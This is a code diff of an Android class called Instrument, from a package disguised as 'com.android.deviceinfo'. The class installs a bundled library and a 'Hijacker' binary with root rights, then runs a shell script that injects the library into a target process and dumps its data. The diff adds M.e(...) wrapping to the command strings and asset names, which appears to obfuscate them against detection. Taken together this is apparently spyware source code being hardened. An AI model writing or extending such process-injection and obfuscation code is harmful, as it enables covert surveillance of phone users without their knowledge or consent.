@@ -13,6 +13,7 @@ import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.m.M;
 
 public class Instrument {
 	private static final String TAG = "Instrument";
@@ -31,17 +32,17 @@ public class Instrument {
 		lib = "n";
 		path = filesPath.getAbsolutePath();
 		dumpPath = dump;
-		pidFile = "irg";
+		pidFile = M.e("irg");
 		pidCompletePath = path + "/" + pidFile;
 	}
 
 	public boolean installHijacker() {
-		InputStream stream = Utils.getAssetStream("i.bin"); // libt.so
+		InputStream stream = Utils.getAssetStream(M.e("i.bin")); // libt.so
 
 		try {
 			// Install library
 			Root.fileWrite(lib, stream, Cfg.RNDDB);
-			Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + path + "/" + lib);
+			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666") + " " + path + "/" + lib);
 
 			// copy_remount libt.so to /system/lib/
 			// Execute.execute(Configuration.shellFile + " " + "fhs" + " " +
@@ -50,11 +51,11 @@ public class Instrument {
 			stream.close();
 
 			// Unpack the Hijacker
-			stream = Utils.getAssetStream("m.bin"); // Hijacker
+			stream = Utils.getAssetStream(M.e("m.bin")); // Hijacker
 
 			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
 			Runtime.getRuntime()
-					.exec(Configuration.shellFile + " " + "pzm" + " " + "750" + " " + path + "/" + hijacker);
+					.exec(Configuration.shellFile + " " + M.e("pzm 750") + " " + path + "/" + hijacker);
 
 			stream.close();
 		} catch (Exception e) {
@@ -77,7 +78,7 @@ public class Instrument {
 		if (pid > 0) {
 			// Run the injector
 			String scriptName = "ij";
-			String script = "#!/system/bin/sh\n";
+			String script = M.e("#!/system/bin/sh\n");
 			script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath;
 
 			Root.createScript(scriptName, script);
@@ -104,7 +105,7 @@ public class Instrument {
 		int pid;
 		byte[] buf = new byte[4];
 
-		Execute.execute(Configuration.shellFile + " " + "lid" + " " + proc + " " + pidCompletePath);
+		Execute.execute(Configuration.shellFile + " " + M.e("lid") + " " + proc + " " + pidCompletePath);
 
 		try {
 			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);
